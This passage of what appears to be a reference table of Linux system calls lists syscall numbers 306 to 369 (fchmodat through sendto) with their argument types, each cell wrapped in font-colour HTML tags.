<font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">306.</font> | <font style=\"color:#4f4f4f;\">fchmodat</font> | <font style=\"color:#4f4f4f;\">306.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char * filename</font> | <font style=\"color:#4f4f4f;\">umode_t mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">307.</font> | <font style=\"color:#4f4f4f;\">faccessat</font> | <font style=\"color:#4f4f4f;\">307.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">int mode</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">308.</font> | <font style=\"color:#4f4f4f;\">pselect6</font> | <font style=\"color:#4f4f4f;\">308.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">fd_set *</font> | <font style=\"color:#4f4f4f;\">fd_set *</font> | <font style=\"color:#4f4f4f;\">fd_set *</font> | <font style=\"color:#4f4f4f;\">struct timespec *</font> | <font style=\"color:#4f4f4f;\">void *</font> |\n| <font style=\"color:#4f4f4f;\">309.</font> | <font style=\"color:#4f4f4f;\">ppoll</font> | <font style=\"color:#4f4f4f;\">309.</font> | <font style=\"color:#4f4f4f;\">struct pollfd *</font> | <font style=\"color:#4f4f4f;\">unsigned int</font> | <font style=\"color:#4f4f4f;\">struct timespec *</font> | <font style=\"color:#4f4f4f;\">const sigset_t *</font> | <font style=\"color:#4f4f4f;\">size_t</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">310.</font> | <font style=\"color:#4f4f4f;\">unshare</font> | <font style=\"color:#4f4f4f;\">310.</font> | <font style=\"color:#4f4f4f;\">unsigned long unshare_flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">311.</font> | <font style=\"color:#4f4f4f;\">set_robust_list</font> | <font style=\"color:#4f4f4f;\">311.</font> | <font style=\"color:#4f4f4f;\">struct robust_list_head *head</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">312.</font> | <font style=\"color:#4f4f4f;\">get_robust_list</font> | <font style=\"color:#4f4f4f;\">312.</font> | <font style=\"color:#4f4f4f;\">int pid</font> | <font style=\"color:#4f4f4f;\">struct robust_list_head * *head_ptr</font> | <font style=\"color:#4f4f4f;\">size_t *len_ptr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">313.</font> | <font style=\"color:#4f4f4f;\">splice</font> | <font style=\"color:#4f4f4f;\">313.</font> | <font style=\"color:#4f4f4f;\">int fd_in</font> | <font style=\"color:#4f4f4f;\">loff_t *off_in</font> | <font style=\"color:#4f4f4f;\">int fd_out</font> | <font style=\"color:#4f4f4f;\">loff_t *off_out</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> |\n| <font style=\"color:#4f4f4f;\">314.</font> | <font style=\"color:#4f4f4f;\">sync_file_range</font> | <font style=\"color:#4f4f4f;\">314.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">loff_t nbytes</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">315.</font> | <font style=\"color:#4f4f4f;\">tee</font> | <font style=\"color:#4f4f4f;\">315.</font> | <font style=\"color:#4f4f4f;\">int fdin</font> | <font style=\"color:#4f4f4f;\">int fdout</font> | <font style=\"color:#4f4f4f;\">size_t len</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">316.</font> | <font style=\"color:#4f4f4f;\">vmsplice</font> | <font style=\"color:#4f4f4f;\">316.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *iov</font> | <font style=\"color:#4f4f4f;\">unsigned long nr_segs</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">317.</font> | <font style=\"color:#4f4f4f;\">move_pages</font> | <font style=\"color:#4f4f4f;\">317.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned long nr_pages</font> | <font style=\"color:#4f4f4f;\">const void * *pages</font> | <font style=\"color:#4f4f4f;\">const int *nodes</font> | <font style=\"color:#4f4f4f;\">int *status</font> | <font style=\"color:#4f4f4f;\">int flags</font> |\n| <font style=\"color:#4f4f4f;\">318.</font> | <font style=\"color:#4f4f4f;\">getcpu</font> | <font style=\"color:#4f4f4f;\">318.</font> | <font style=\"color:#4f4f4f;\">unsigned *cpu</font> | <font style=\"color:#4f4f4f;\">unsigned *node</font> | <font style=\"color:#4f4f4f;\">struct getcpu_cache *cache</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">319.</font> | <font style=\"color:#4f4f4f;\">epoll_pwait</font> | <font style=\"color:#4f4f4f;\">319.</font> | <font style=\"color:#4f4f4f;\">int epfd</font> | <font style=\"color:#4f4f4f;\">struct epoll_event *events</font> | <font style=\"color:#4f4f4f;\">int maxevents</font> | <font style=\"color:#4f4f4f;\">int timeout</font> | <font style=\"color:#4f4f4f;\">const sigset_t *sigmask</font> | <font style=\"color:#4f4f4f;\">size_t sigsetsize</font> |\n| <font style=\"color:#4f4f4f;\">320.</font> | <font style=\"color:#4f4f4f;\">utimensat</font> | <font style=\"color:#4f4f4f;\">320.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">struct timespec *utimes</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">321.</font> | <font style=\"color:#4f4f4f;\">signalfd</font> | <font style=\"color:#4f4f4f;\">321.</font> | <font style=\"color:#4f4f4f;\">int ufd</font> | <font style=\"color:#4f4f4f;\">sigset_t *user_mask</font> | <font style=\"color:#4f4f4f;\">size_t sizemask</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">322.</font> | <font style=\"color:#4f4f4f;\">timerfd_create</font> | <font style=\"color:#4f4f4f;\">322.</font> | <font style=\"color:#4f4f4f;\">int clockid</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">323.</font> | <font style=\"color:#4f4f4f;\">eventfd</font> | <font style=\"color:#4f4f4f;\">323.</font> | <font style=\"color:#4f4f4f;\">unsigned int count</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">324.</font> | <font style=\"color:#4f4f4f;\">fallocate</font> | <font style=\"color:#4f4f4f;\">324.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int mode</font> | <font style=\"color:#4f4f4f;\">loff_t offset</font> | <font style=\"color:#4f4f4f;\">loff_t len</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">325.</font> | <font style=\"color:#4f4f4f;\">timerfd_settime</font> | <font style=\"color:#4f4f4f;\">325.</font> | <font style=\"color:#4f4f4f;\">int ufd</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">const struct __kernel_itimerspec *utmr</font> | <font style=\"color:#4f4f4f;\">struct __kernel_itimerspec *otmr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">326.</font> | <font style=\"color:#4f4f4f;\">timerfd_gettime</font> | <font style=\"color:#4f4f4f;\">326.</font> | <font style=\"color:#4f4f4f;\">int ufd</font> | <font style=\"color:#4f4f4f;\">struct __kernel_itimerspec *otmr</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">327.</font> | <font style=\"color:#4f4f4f;\">signalfd4</font> | <font style=\"color:#4f4f4f;\">327.</font> | <font style=\"color:#4f4f4f;\">int ufd</font> | <font style=\"color:#4f4f4f;\">sigset_t *user_mask</font> | <font style=\"color:#4f4f4f;\">size_t sizemask</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">328.</font> | <font style=\"color:#4f4f4f;\">eventfd2</font> | <font style=\"color:#4f4f4f;\">328.</font> | <font style=\"color:#4f4f4f;\">unsigned int count</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">329.</font> | <font style=\"color:#4f4f4f;\">epoll_create1</font> | <font style=\"color:#4f4f4f;\">329.</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">330.</font> | <font style=\"color:#4f4f4f;\">dup3</font> | <font style=\"color:#4f4f4f;\">330.</font> | <font style=\"color:#4f4f4f;\">unsigned int oldfd</font> | <font style=\"color:#4f4f4f;\">unsigned int newfd</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">331.</font> | <font style=\"color:#4f4f4f;\">pipe2</font> | <font style=\"color:#4f4f4f;\">331.</font> | <font style=\"color:#4f4f4f;\">int *fildes</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">332.</font> | <font style=\"color:#4f4f4f;\">inotify_init1</font> | <font style=\"color:#4f4f4f;\">332.</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">333.</font> | <font style=\"color:#4f4f4f;\">preadv</font> | <font style=\"color:#4f4f4f;\">333.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_l</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_h</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">334.</font> | <font style=\"color:#4f4f4f;\">pwritev</font> | <font style=\"color:#4f4f4f;\">334.</font> | <font style=\"color:#4f4f4f;\">unsigned long fd</font> | <font style=\"color:#4f4f4f;\">const struct iovec *vec</font> | <font style=\"color:#4f4f4f;\">unsigned long vlen</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_l</font> | <font style=\"color:#4f4f4f;\">unsigned long pos_h</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">335.</font> | <font style=\"color:#4f4f4f;\">rt_tgsigqueueinfo</font> | <font style=\"color:#4f4f4f;\">335.</font> | <font style=\"color:#4f4f4f;\">pid_t tgid</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int sig</font> | <font style=\"color:#4f4f4f;\">siginfo_t *uinfo</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">336.</font> | <font style=\"color:#4f4f4f;\">perf_event_open</font> | <font style=\"color:#4f4f4f;\">336.</font> | <font style=\"color:#4f4f4f;\">struct perf_event_attr *attr_uptr</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">int cpu</font> | <font style=\"color:#4f4f4f;\">int group_fd</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">337.</font> | <font style=\"color:#4f4f4f;\">recvmmsg</font> | <font style=\"color:#4f4f4f;\">337.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct mmsghdr *msg</font> | <font style=\"color:#4f4f4f;\">unsigned int vlen</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> | <font style=\"color:#4f4f4f;\">struct timespec *timeout</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">338.</font> | <font style=\"color:#4f4f4f;\">fanotify_init</font> | <font style=\"color:#4f4f4f;\">338.</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">unsigned int event_f_flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">339.</font> | <font style=\"color:#4f4f4f;\">fanotify_mark</font> | <font style=\"color:#4f4f4f;\">339.</font> | <font style=\"color:#4f4f4f;\">int fanotify_fd</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">u64 mask</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *pathname</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">340.</font> | <font style=\"color:#4f4f4f;\">prlimit64</font> | <font style=\"color:#4f4f4f;\">340.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">unsigned int resource</font> | <font style=\"color:#4f4f4f;\">const struct rlimit64 *new_rlim</font> | <font style=\"color:#4f4f4f;\">struct rlimit64 *old_rlim</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">341.</font> | <font style=\"color:#4f4f4f;\">name_to_handle_at</font> | <font style=\"color:#4f4f4f;\">341.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *name</font> | <font style=\"color:#4f4f4f;\">struct file_handle *handle</font> | <font style=\"color:#4f4f4f;\">int *mnt_id</font> | <font style=\"color:#4f4f4f;\">int flag</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">342.</font> | <font style=\"color:#4f4f4f;\">open_by_handle_at</font> | <font style=\"color:#4f4f4f;\">342.</font> | <font style=\"color:#4f4f4f;\">int mountdirfd</font> | <font style=\"color:#4f4f4f;\">struct file_handle *handle</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">343.</font> | <font style=\"color:#4f4f4f;\">clock_adjtime</font> | <font style=\"color:#4f4f4f;\">343.</font> | <font style=\"color:#4f4f4f;\">clockid_t which_clock</font> | <font style=\"color:#4f4f4f;\">struct timex *tx</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">344.</font> | <font style=\"color:#4f4f4f;\">syncfs</font> | <font style=\"color:#4f4f4f;\">344.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">345.</font> | <font style=\"color:#4f4f4f;\">sendmmsg</font> | <font style=\"color:#4f4f4f;\">345.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">struct mmsghdr *msg</font> | <font style=\"color:#4f4f4f;\">unsigned int vlen</font> | <font style=\"color:#4f4f4f;\">unsigned flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">346.</font> | <font style=\"color:#4f4f4f;\">setns</font> | <font style=\"color:#4f4f4f;\">346.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int nstype</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">347.</font> | <font style=\"color:#4f4f4f;\">process_vm_readv</font> | <font style=\"color:#4f4f4f;\">347.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">const struct iovec *lvec</font> | <font style=\"color:#4f4f4f;\">unsigned long liovcnt</font> | <font style=\"color:#4f4f4f;\">const struct iovec *rvec</font> | <font style=\"color:#4f4f4f;\">unsigned long riovcnt</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> |\n| <font style=\"color:#4f4f4f;\">348.</font> | <font style=\"color:#4f4f4f;\">process_vm_writev</font> | <font style=\"color:#4f4f4f;\">348.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">const struct iovec *lvec</font> | <font style=\"color:#4f4f4f;\">unsigned long liovcnt</font> | <font style=\"color:#4f4f4f;\">const struct iovec *rvec</font> | <font style=\"color:#4f4f4f;\">unsigned long riovcnt</font> | <font style=\"color:#4f4f4f;\">unsigned long flags</font> |\n| <font style=\"color:#4f4f4f;\">349.</font> | <font style=\"color:#4f4f4f;\">kcmp</font> | <font style=\"color:#4f4f4f;\">349.</font> | <font style=\"color:#4f4f4f;\">pid_t pid1</font> | <font style=\"color:#4f4f4f;\">pid_t pid2</font> | <font style=\"color:#4f4f4f;\">int type</font> | <font style=\"color:#4f4f4f;\">unsigned long idx1</font> | <font style=\"color:#4f4f4f;\">unsigned long idx2</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">350.</font> | <font style=\"color:#4f4f4f;\">finit_module</font> | <font style=\"color:#4f4f4f;\">350.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">const char *uargs</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">351.</font> | <font style=\"color:#4f4f4f;\">sched_setattr</font> | <font style=\"color:#4f4f4f;\">351.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct sched_attr *attr</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">352.</font> | <font style=\"color:#4f4f4f;\">sched_getattr</font> | <font style=\"color:#4f4f4f;\">352.</font> | <font style=\"color:#4f4f4f;\">pid_t pid</font> | <font style=\"color:#4f4f4f;\">struct sched_attr *attr</font> | <font style=\"color:#4f4f4f;\">unsigned int size</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">353.</font> | <font style=\"color:#4f4f4f;\">renameat2</font> | <font style=\"color:#4f4f4f;\">353.</font> | <font style=\"color:#4f4f4f;\">int olddfd</font> | <font style=\"color:#4f4f4f;\">const char *oldname</font> | <font style=\"color:#4f4f4f;\">int newdfd</font> | <font style=\"color:#4f4f4f;\">const char *newname</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">354.</font> | <font style=\"color:#4f4f4f;\">seccomp</font> | <font style=\"color:#4f4f4f;\">354.</font> | <font style=\"color:#4f4f4f;\">unsigned int op</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">const char *uargs</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">355.</font> | <font style=\"color:#4f4f4f;\">getrandom</font> | <font style=\"color:#4f4f4f;\">355.</font> | <font style=\"color:#4f4f4f;\">char *buf</font> | <font style=\"color:#4f4f4f;\">size_t count</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">356.</font> | <font style=\"color:#4f4f4f;\">memfd_create</font> | <font style=\"color:#4f4f4f;\">356.</font> | <font style=\"color:#4f4f4f;\">const char *uname_ptr</font> | <font style=\"color:#4f4f4f;\">unsigned int flags</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">357.</font> | <font style=\"color:#4f4f4f;\">bpf</font> | <font style=\"color:#4f4f4f;\">357.</font> | <font style=\"color:#4f4f4f;\">int cmd</font> | <font style=\"color:#4f4f4f;\">union bpf_attr *attr</font> | <font style=\"color:#4f4f4f;\">unsigned int size</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">358.</font> | <font style=\"color:#4f4f4f;\">execveat</font> | <font style=\"color:#4f4f4f;\">358.</font> | <font style=\"color:#4f4f4f;\">int dfd</font> | <font style=\"color:#4f4f4f;\">const char *filename</font> | <font style=\"color:#4f4f4f;\">const char *const *argv</font> | <font style=\"color:#4f4f4f;\">const char *const *envp</font> | <font style=\"color:#4f4f4f;\">int flags</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">359.</font> | <font style=\"color:#4f4f4f;\">socket</font> | <font style=\"color:#4f4f4f;\">359.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">360.</font> | <font style=\"color:#4f4f4f;\">socketpair</font> | <font style=\"color:#4f4f4f;\">360.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">int *</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">361.</font> | <font style=\"color:#4f4f4f;\">bind</font> | <font style=\"color:#4f4f4f;\">361.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">362.</font> | <font style=\"color:#4f4f4f;\">connect</font> | <font style=\"color:#4f4f4f;\">362.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">363.</font> | <font style=\"color:#4f4f4f;\">listen</font> | <font style=\"color:#4f4f4f;\">363.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">364.</font> | <font style=\"color:#4f4f4f;\">accept4</font> | <font style=\"color:#4f4f4f;\">364.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *</font> | <font style=\"color:#4f4f4f;\">int *</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">365.</font> | <font style=\"color:#4f4f4f;\">getsockopt</font> | <font style=\"color:#4f4f4f;\">365.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int level</font> | <font style=\"color:#4f4f4f;\">int optname</font> | <font style=\"color:#4f4f4f;\">char *optval</font> | <font style=\"color:#4f4f4f;\">int *optlen</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">366.</font> | <font style=\"color:#4f4f4f;\">setsockopt</font> | <font style=\"color:#4f4f4f;\">366.</font> | <font style=\"color:#4f4f4f;\">int fd</font> | <font style=\"color:#4f4f4f;\">int level</font> | <font style=\"color:#4f4f4f;\">int optname</font> | <font style=\"color:#4f4f4f;\">char *optval</font> | <font style=\"color:#4f4f4f;\">int optlen</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">367.</font> | <font style=\"color:#4f4f4f;\">getsockname</font> | <font style=\"color:#4f4f4f;\">367.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *</font> | <font style=\"color:#4f4f4f;\">int *</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">368.</font> | <font style=\"color:#4f4f4f;\">getpeername</font> | <font style=\"color:#4f4f4f;\">368.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *</font> | <font style=\"color:#4f4f4f;\">int *</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> | <font style=\"color:#4f4f4f;\">-</font> |\n| <font style=\"color:#4f4f4f;\">369.</font> | <font style=\"color:#4f4f4f;\">sendto</font> | <font style=\"color:#4f4f4f;\">369.</font> | <font style=\"color:#4f4f4f;\">int</font> | <font style=\"color:#4f4f4f;\">void *</font> | <font style=\"color:#4f4f4f;\">size_t</font> | <font style=\"color:#4f4f4f;\">unsigned</font> | <font style=\"color:#4f4f4f;\">struct sockaddr *</font> | <font style=\"color:#4f4f4f;\">int</font> |\n| <font 